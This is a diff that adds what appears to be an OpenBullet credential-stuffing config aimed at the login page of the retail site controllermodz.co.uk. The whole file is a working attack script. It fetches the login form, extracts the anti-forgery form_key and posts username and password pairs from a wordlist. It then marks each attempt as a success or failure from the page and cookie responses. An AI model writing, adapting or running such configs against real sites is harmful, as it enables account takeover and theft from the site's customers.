@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "controllermodz.co.uk",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-21T21:20:45.2738027+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://controllermodz.co.uk/customer/account/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#form_key PARSE "<SOURCE>" CSS "[name=form_key]" "value" 0 -> VAR "form_key" "" "" 
+#POST REQUEST POST "https://controllermodz.co.uk/customer/account/loginPost/" AutoRedirect=TRUE 
+  CONTENT "form_key=<form_key>&login[username]=<USER>&login[password]=<PASS>&persistent_remember_me=on&send=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://controllermodz.co.uk" 
+  HEADER "referer: https://controllermodz.co.uk/customer/account/login/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "<COOKIES(*)>" Contains "Invalid+login+or+password" 
+  KEYCHAIN Success OR 
+    KEY "Account Information" 
